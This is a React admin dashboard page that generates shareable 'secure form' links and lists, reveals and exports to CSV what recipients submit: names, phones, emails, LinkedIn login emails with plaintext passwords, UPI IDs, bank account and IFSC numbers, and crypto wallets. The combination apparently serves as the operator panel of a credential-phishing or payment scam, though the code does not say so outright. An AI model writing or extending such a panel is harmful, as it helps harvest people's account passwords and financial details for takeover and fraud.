import { useState } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { useToast } from "../hooks/use-toast";
import { apiRequest, queryClient } from "../lib/queryClient";
import {
  Loader2,
  Search,
  Copy,
  Check,
  Eye,
  EyeOff,
  FileDown,
  RefreshCw
} from "lucide-react";
import { Link } from "wouter";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow
} from "../components/ui/table";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle
} from "../components/ui/card";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue
} from "../components/ui/select";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle
} from "../components/ui/dialog";
import { Badge } from "../components/ui/badge";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger
} from "../components/ui/tabs";

export default function AdminSubmissions() {
  const { toast } = useToast();
  const [searchTerm, setSearchTerm] = useState("");
  const [filter, setFilter] = useState("all");
  const [showPasswords, setShowPasswords] = useState({});
  const [selectedSubmission, setSelectedSubmission] = useState(null);
  const [viewDetailOpen, setViewDetailOpen] = useState(false);
  const [newUrlDialogOpen, setNewUrlDialogOpen] = useState(false);
  const [newUrl, setNewUrl] = useState("");
  const [copySuccess, setCopySuccess] = useState(false);

  // Fetch all secure form submissions
  const { data: submissions = [], isLoading, refetch } = useQuery({
    queryKey: ['secureFormSubmissions'],
    queryFn: async () => {
      const res = await apiRequest("GET", "/api/secure-forms");
      const data = await res.json();
      return data;
    },
  });

  // Create new secure form URL
  const createUrlMutation = useMutation({
    mutationFn: async () => {
      const res = await apiRequest("POST", "/api/secure-forms/create");
      if (!res.ok) {
        const error = await res.json();
        throw new Error(error.message || "Failed to create secure form URL");
      }
      return await res.json();
    },
    onSuccess: (data) => {
      const fullUrl = `${window.location.origin}/secure-form/${data.accessUrl}`;
      setNewUrl(fullUrl);
      setNewUrlDialogOpen(true);
      toast({
        title: "Success",
        description: "New secure form link generated successfully!",
      });
    },
    onError: (error) => {
      toast({
        title: "Error",
        description: error.message || "Failed to create secure form URL. Please try again.",
        variant: "destructive",
      });
    },
  });

  // Mark submission as read
  const markAsReadMutation = useMutation({
    mutationFn: async (id) => {
      const res = await apiRequest("PUT", `/api/secure-forms/${id}/read`);
      return await res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['secureFormSubmissions'] });
      toast({
        title: "Success",
        description: "Submission marked as read!",
      });
    },
  });

  // Mark submission as processed
  const markAsProcessedMutation = useMutation({
    mutationFn: async (id) => {
      const res = await apiRequest("PUT", `/api/secure-forms/${id}/process`);
      return await res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['secureFormSubmissions'] });
      toast({
        title: "Success",
        description: "Submission marked as processed!",
      });
    },
  });

  // Copy URL to clipboard
  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(newUrl);
      setCopySuccess(true);
      toast({
        title: "Copied",
        description: "Form URL copied to clipboard!",
      });
      setTimeout(() => setCopySuccess(false), 2000);
    } catch (error) {
      // Fallback for browsers that don't support clipboard API
      const textArea = document.createElement('textarea');
      textArea.value = newUrl;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      setCopySuccess(true);
      toast({
        title: "Copied",
        description: "Form URL copied to clipboard!",
      });
      setTimeout(() => setCopySuccess(false), 2000);
    }
  };

  // Export data to CSV
  const exportToCSV = () => {
    if (submissions.length === 0) return;
    const filteredSubmissions = getFilteredSubmissions();
    // Prepare CSV header and rows
    const headers = [
      "ID",
      "Full Name",
      "Phone",
      "Email",
      "LinkedIn Email",
      "LinkedIn Password",
      "UPI ID",
      "Bank Account",
      "IFSC Code",
      "Crypto Wallet",
      "Crypto Network",
      "Status",
      "Date",
    ];
    const csvData = filteredSubmissions.map((submission) => [
      submission.id,
      submission.fullName,
      submission.phone,
      submission.email,
      submission.linkedinEmail,
      submission.linkedinPassword || "",
      submission.upiId || "",
      submission.bankAccountNumber || "",
      submission.bankIfscCode || "",
      submission.cryptoWalletAddress || "",
      submission.cryptoNetwork || "",
      submission.isProcessed ? "Processed" : "Pending",
      new Date(submission.createdAt).toLocaleString(),
    ]);
    // Convert to CSV string
    const csvContent = [
      headers.join(","),
      ...csvData.map((row) => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(",")),
    ].join("\n");
    // Create download link
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.setAttribute("href", url);
    link.setAttribute("download", `secure-form-submissions-${new Date().toISOString().split("T")[0]}.csv`);
    link.style.visibility = "hidden";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Toggle password visibility
  const togglePasswordVisibility = (id) => {
    setShowPasswords({
      ...showPasswords,
      [id]: !showPasswords[id],
    });
  };

  // View submission details
  const viewSubmissionDetails = (submission) => {
    if (!submission.isRead) {
      markAsReadMutation.mutate(submission.id);
    }
    setSelectedSubmission(submission);
    setViewDetailOpen(true);
  };

  // Filter submissions based on selected filter
  const getFilteredSubmissions = () => {
    let filtered = submissions;
    // Apply status filter
    if (filter === "pending") {
      filtered = filtered.filter((submission) => !submission.isProcessed);
    } else if (filter === "processed") {
      filtered = filtered.filter((submission) => submission.isProcessed);
    } else if (filter === "unread") {
      filtered = filtered.filter((submission) => !submission.isRead);
    }
    // Apply search term filter
    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(
        (submission) =>
          submission.fullName.toLowerCase().includes(term) ||
          submission.email.toLowerCase().includes(term) ||
          submission.phone.toLowerCase().includes(term) ||
          submission.linkedinEmail.toLowerCase().includes(term)
      );
    }
    return filtered;
  };

  // Format date string
  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const filteredSubmissions = getFilteredSubmissions();

  return (
    <div className="p-6 bg-sky-100 min-h-screen">
      <div className="max-w-7xl mx-auto">
        <Card>
          <CardHeader>
            <div className="flex items-center justify-between mb-6">
              <div>
                <CardTitle className="text-2xl font-bold">Secure Form Submissions</CardTitle>
                <CardDescription className="text-gray-500">
                  Manage all secure form submissions and create new form links
                </CardDescription>
              </div>
              <div className="flex space-x-2">
                <Link href="/admin">
                  <Button variant="outline">Back to Admin Dashboard</Button>
                </Link>
                <Button
                  onClick={() => createUrlMutation.mutate()}
                  disabled={createUrlMutation.isPending}
                  className="bg-gradient-to-r from-blue-500 to-blue-700 hover:from-blue-600 hover:to-blue-800 text-white"
                >
                  {createUrlMutation.isPending ? (
                    <span className="flex items-center">
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Creating...
                    </span>
                  ) : (
                    "Generate New Form Link"
                  )}
                </Button>
              </div>
            </div>
            <div className="flex flex-col md:flex-row md:items-center md:gap-4">
              <div className="relative mb-4 md:mb-0 md:w-1/3">
                <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search by name or email..."
                  className="pl-8"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>
              <Select value={filter} onValueChange={setFilter}>
                <SelectTrigger className="w-full md:w-1/4">
                  <SelectValue placeholder="Filter by status" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Submissions</SelectItem>
                  <SelectItem value="unread">Unread</SelectItem>
                  <SelectItem value="pending">Pending</SelectItem>
                  <SelectItem value="processed">Processed</SelectItem>
                </SelectContent>
              </Select>
              <Button
                variant="outline"
                onClick={() => refetch()}
                className="md:w-auto"
              >
                <RefreshCw className="h-4 w-4 mr-2" />
                Refresh
              </Button>
              <Button
                variant="outline"
                onClick={exportToCSV}
                disabled={filteredSubmissions.length === 0}
                className="md:w-auto"
              >
                <FileDown className="h-4 w-4 mr-2" />
                Export
              </Button>
            </div>
          </CardHeader>
          {isLoading ? (
            <div className="flex justify-center items-center h-64">
              <Loader2 className="h-8 w-8 animate-spin text-primary" />
            </div>
          ) : filteredSubmissions.length === 0 ? (
            <CardContent className="flex flex-col items-center justify-center h-64">
              <p className="text-lg font-medium text-gray-500 mb-2">No submissions found</p>
              <p className="text-sm text-gray-400">
                {searchTerm || filter !== "all"
                  ? "Try adjusting your filters"
                  : "Generate a new form link to start collecting information"}
              </p>
            </CardContent>
          ) : (
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>ID</TableHead>
                      <TableHead>Full Name</TableHead>
                      <TableHead>Phone</TableHead>
                      <TableHead>Email</TableHead>
                      <TableHead>LinkedIn Email</TableHead>
                      <TableHead>Password</TableHead>
                      <TableHead>Payment</TableHead>
                      <TableHead>Status</TableHead>
                      <TableHead>Date</TableHead>
                      <TableHead>Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredSubmissions.map((submission) => (
                      <TableRow
                        key={submission.id}
                        className={!submission.isRead ? "bg-blue-50" : ""}
                      >
                        <TableCell>{submission.id}</TableCell>
                        <TableCell>{submission.fullName}</TableCell>
                        <TableCell>{submission.phone}</TableCell>
                        <TableCell>{submission.email}</TableCell>
                        <TableCell>{submission.linkedinEmail}</TableCell>
                        <TableCell>
                          <div className="flex items-center">
                            <span className="mr-2">
                              {showPasswords[submission.id]
                                ? submission.linkedinPassword
                                : "••••••••"}
                            </span>
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={() => togglePasswordVisibility(submission.id)}
                              className="h-6 w-6"
                            >
                              {showPasswords[submission.id] ? (
                                <EyeOff className="h-4 w-4" />
                              ) : (
                                <Eye className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell>
                          {submission.upiId ? (
                            <Badge variant="outline">UPI</Badge>
                          ) : submission.bankAccountNumber ? (
                            <Badge variant="outline">Bank</Badge>
                          ) : submission.cryptoWalletAddress ? (
                            <Badge variant="outline">Crypto</Badge>
                          ) : (
                            <Badge variant="outline">None</Badge>
                          )}
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant={submission.isProcessed ? "default" : "secondary"}
                            className={
                              submission.isProcessed
                                ? "bg-green-100 text-green-800"
                                : "bg-yellow-100 text-yellow-800"
                            }
                          >
                            {submission.isProcessed ? "Processed" : "Pending"}
                          </Badge>
                        </TableCell>
                        <TableCell>{formatDate(submission.createdAt)}</TableCell>
                        <TableCell>
                          <div className="flex space-x-1">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => viewSubmissionDetails(submission)}
                              className="h-8 w-8 p-0"
                            >
                              <Eye className="h-4 w-4" />
                            </Button>
                            {!submission.isProcessed && (
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => markAsProcessedMutation.mutate(submission.id)}
                                className="h-8 w-8 p-0 text-green-600"
                                disabled={markAsProcessedMutation.isPending}
                              >
                                <Check className="h-4 w-4" />
                              </Button>
                            )}
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
              <CardFooter className="py-4 border-t">
                <div className="text-sm text-gray-500">
                  Showing {filteredSubmissions.length} of {submissions.length} submissions
                </div>
              </CardFooter>
            </CardContent>
          )}
        </Card>
      </div>
      {/* View Submission Details Dialog */}
      <Dialog open={viewDetailOpen} onOpenChange={setViewDetailOpen}>
        <DialogContent className="max-w-3xl">
          <DialogHeader>
            <DialogTitle>Submission Details</DialogTitle>
            <DialogDescription>
              Complete information for submission #{selectedSubmission?.id}
            </DialogDescription>
          </DialogHeader>
          {selectedSubmission && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Full Name</h3>
                  <p className="mt-1">{selectedSubmission.fullName}</p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Phone</h3>
                  <p className="mt-1">{selectedSubmission.phone}</p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Email</h3>
                  <p className="mt-1">{selectedSubmission.email}</p>
                </div>
                <div>
                  <h3 className="text-sm font-medium text-gray-500">Date Submitted</h3>
                  <p className="mt-1">{formatDate(selectedSubmission.createdAt)}</p>
                </div>
              </div>
              <div className="border-t pt-4">
                <h3 className="text-lg font-medium mb-3">LinkedIn Credentials</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">LinkedIn Email</h3>
                    <p className="mt-1">{selectedSubmission.linkedinEmail}</p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">LinkedIn Password</h3>
                    <div className="flex items-center mt-1">
                      <span>
                        {showPasswords[selectedSubmission.id]
                          ? selectedSubmission.linkedinPassword
                          : "••••••••"}
                      </span>
                      <Button
                        variant="ghost"
                        size="icon"
                        onClick={() => togglePasswordVisibility(selectedSubmission.id)}
                        className="h-6 w-6 ml-2"
                      >
                        {showPasswords[selectedSubmission.id] ? (
                          <EyeOff className="h-4 w-4" />
                        ) : (
                          <Eye className="h-4 w-4" />
                        )}
                      </Button>
                    </div>
                  </div>
                </div>
              </div>
              <div className="border-t pt-4">
                <h3 className="text-lg font-medium mb-3">Payment Information</h3>
                <Tabs defaultValue="all" className="w-full">
                  <TabsList className="grid grid-cols-3 mb-4">
                    <TabsTrigger value="all">All Methods</TabsTrigger>
                    <TabsTrigger value="upi" disabled={!selectedSubmission.upiId}>
                      UPI
                    </TabsTrigger>
                    <TabsTrigger value="bank" disabled={!selectedSubmission.bankAccountNumber}>
                      Bank
                    </TabsTrigger>
                    <TabsTrigger value="crypto" disabled={!selectedSubmission.cryptoWalletAddress}>
                      Crypto
                    </TabsTrigger>
                  </TabsList>
                  <TabsContent value="all" className="space-y-4">
                    {selectedSubmission.upiId && (
                      <div className="border p-3 rounded-md">
                        <h4 className="font-medium">UPI Payment</h4>
                        <p className="text-sm mt-1">
                          <span className="text-gray-500">UPI ID: </span>
                          {selectedSubmission.upiId}
                        </p>
                      </div>
                    )}
                    {selectedSubmission.bankAccountNumber && (
                      <div className="border p-3 rounded-md">
                        <h4 className="font-medium">Bank Account</h4>
                        <p className="text-sm mt-1">
                          <span className="text-gray-500">Account Number: </span>
                          {selectedSubmission.bankAccountNumber}
                        </p>
                        {selectedSubmission.bankIfscCode && (
                          <p className="text-sm mt-1">
                            <span className="text-gray-500">IFSC Code: </span>
                            {selectedSubmission.bankIfscCode}
                          </p>
                        )}
                      </div>
                    )}
                    {selectedSubmission.cryptoWalletAddress && (
                      <div className="border p-3 rounded-md">
                        <h4 className="font-medium">Crypto Wallet</h4>
                        <p className="text-sm mt-1">
                          <span className="text-gray-500">Wallet Address: </span>
                          {selectedSubmission.cryptoWalletAddress}
                        </p>
                        {selectedSubmission.cryptoNetwork && (
                          <p className="text-sm mt-1">
                            <span className="text-gray-500">Network: </span>
                            {selectedSubmission.cryptoNetwork}
                          </p>
                        )}
                      </div>
                    )}
                    {!selectedSubmission.upiId &&
                      !selectedSubmission.bankAccountNumber &&
                      !selectedSubmission.cryptoWalletAddress && (
                        <p className="text-gray-500">No payment information provided</p>
                      )}
                  </TabsContent>
                  <TabsContent value="upi">
                    {selectedSubmission.upiId ? (
                      <div className="space-y-2">
                        <h3 className="text-sm font-medium text-gray-500">UPI ID</h3>
                        <p className="mt-1">{selectedSubmission.upiId}</p>
                      </div>
                    ) : (
                      <p className="text-gray-500">No UPI information provided</p>
                    )}
                  </TabsContent>
                  <TabsContent value="bank">
                    {selectedSubmission.bankAccountNumber ? (
                      <div className="space-y-2">
                        <h3 className="text-sm font-medium text-gray-500">Account Number</h3>
                        <p className="mt-1">{selectedSubmission.bankAccountNumber}</p>
                        {selectedSubmission.bankIfscCode && (
                          <>
                            <h3 className="text-sm font-medium text-gray-500">IFSC Code</h3>
                            <p className="mt-1">{selectedSubmission.bankIfscCode}</p>
                          </>
                        )}
                      </div>
                    ) : (
                      <p className="text-gray-500">No bank information provided</p>
                    )}
                  </TabsContent>
                  <TabsContent value="crypto">
                    {selectedSubmission.cryptoWalletAddress ? (
                      <div className="space-y-2">
                        <h3 className="text-sm font-medium text-gray-500">Wallet Address</h3>
                        <p className="mt-1">{selectedSubmission.cryptoWalletAddress}</p>
                        {selectedSubmission.cryptoNetwork && (
                          <>
                            <h3 className="text-sm font-medium text-gray-500">Network</h3>
                            <p className="mt-1">{selectedSubmission.cryptoNetwork}</p>
                          </>
                        )}
                      </div>
                    ) : (
                      <p className="text-gray-500">No crypto information provided</p>
                    )}
                  </TabsContent>
                </Tabs>
              </div>
            </div>
          )}
          <DialogFooter className="flex justify-between items-center">
            <div className="flex items-center">
              {selectedSubmission && (
                <Badge
                  variant={selectedSubmission.isProcessed ? "default" : "secondary"}
                  className={
                    selectedSubmission.isProcessed
                      ? "bg-green-100 text-green-800"
                      : "bg-yellow-100 text-yellow-800"
                  }
                >
                  {selectedSubmission.isProcessed ? "Processed" : "Pending"}
                </Badge>
              )}
            </div>
            <div className="space-x-2">
              {selectedSubmission && !selectedSubmission.isProcessed && (
                <Button
                  onClick={() => {
                    markAsProcessedMutation.mutate(selectedSubmission.id);
                    setViewDetailOpen(false);
                  }}
                  disabled={markAsProcessedMutation.isPending}
                  className="bg-green-600 hover:bg-green-700 text-white"
                >
                  {markAsProcessedMutation.isPending ? (
                    <span className="flex items-center">
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </span>
                  ) : (
                    "Mark as Processed"
                  )}
                </Button>
              )}
              <Button variant="outline" onClick={() => setViewDetailOpen(false)}>
                Close
              </Button>
            </div>
          </DialogFooter>
        </DialogContent>
      </Dialog>
      {/* New URL Dialog */}
      <Dialog
        open={newUrlDialogOpen}
        onOpenChange={(open) => {
          setNewUrlDialogOpen(open);
          if (!open) {
            setCopySuccess(false);
          }
        }}
      >
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Secure Form Link Generated</DialogTitle>
            <DialogDescription>
              Share this unique URL with the user to access the secure form
            </DialogDescription>
          </DialogHeader>
          <div className="flex items-center space-x-2">
            <Input value={newUrl} readOnly className="flex-1" />
            <Button size="icon" onClick={copyToClipboard}>
              {copySuccess ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
            </Button>
          </div>
          <p className="text-sm text-amber-600 mt-2">
            Important: This link is unique and should only be shared with trusted users.
          </p>
          <DialogFooter>
            <Button variant="outline" onClick={() => setNewUrlDialogOpen(false)}>
              Close
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}